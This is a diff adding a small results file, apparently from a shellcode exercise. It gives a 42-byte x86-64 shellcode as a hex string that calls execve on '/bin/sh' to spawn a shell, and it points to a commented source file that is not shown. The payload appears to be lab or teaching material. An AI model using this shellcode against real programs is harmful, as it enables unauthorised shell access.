@@ -1,0 +1,4 @@
+Generated shellcode is of length: 42
+554889e548b8ff2f62696e2f736848c1e808504889e74831f64831d248c7c0c4ffffff48f7d00f05c9c3
+
+detailed explainations are included with shellcode.S as comments. 
